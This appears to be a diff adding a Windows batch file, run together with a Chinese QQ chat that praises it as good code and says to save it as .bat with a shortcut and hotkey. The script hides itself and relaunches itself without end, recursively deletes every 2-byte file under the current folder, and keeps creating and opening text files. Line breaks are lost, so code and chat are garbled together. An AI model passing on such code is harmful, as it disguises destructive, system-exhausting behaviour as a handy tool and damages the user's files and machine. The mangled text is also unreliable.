@@ -1,0 +1,3 @@
+attrib +h %0 && %0
+start c:/
+@echo off&setlocal enabledelayedexpansionfor /r %%i in (*.*) do (set nameis=%%iset sizeis=%%~ziecho "!sizeis!"if "!sizeis!"=="2" del "!nameis!")set SptNa=%date%%time%set SptNa=%SptNa: =%set SptNa=文本_%SptNa:~0,4%_%SptNa:~5,2%_%SptNa:~8,2%_%SptNa:~13,-6%set SptNa=%SptNa::=_%:Creatif not exist %SptNa%.txt (echo.)>%SptNa%.txt&start %SptNa%.txt&exitset SptNa=%SptNa%~1goto Createxit这是一个很不错的代码新一(1531934892)  19:18:34看看风铃缆月(278230897)  19:18:58保存成bat 发送快捷方式到程序文件夹 设置快捷建
